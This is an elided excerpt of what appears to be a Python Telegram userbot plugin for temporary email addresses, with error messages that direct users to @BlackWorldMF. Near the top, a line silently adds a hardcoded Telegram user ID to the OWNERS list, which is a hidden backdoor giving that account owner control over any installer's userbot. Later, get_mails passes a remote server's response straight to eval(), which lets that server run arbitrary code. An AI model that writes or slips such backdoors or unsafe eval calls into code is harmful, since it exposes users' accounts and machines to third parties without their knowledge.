...
OWNERS.append(6190680150) if 6190680150 not in OWNERS else None
...
async def gen_id(event):
    ...
    try:
        ...
        await e.edit(
            "Unknown error while fetching domain list, report to @BlackWorldMF."
        )
...
async def get_mails(ev, email):
    ...
    resp = get(api_uri)
    if resp.status_code != 200:
        await ev.edit("Server down! Report to @BlackWorldMF.")
        return
    try:
        mails = eval(resp.text)
    except Exception as exc:
        await ev.edit("Error while parsing mailbox. Report to @BlackWorldMF.")
    ...
    for mail in mails:
        if mail.get("id") == int(mail_id):
            ...
            try:
                ...
                await ev.edit("Error while email content. Report to @BlackWorldMF")
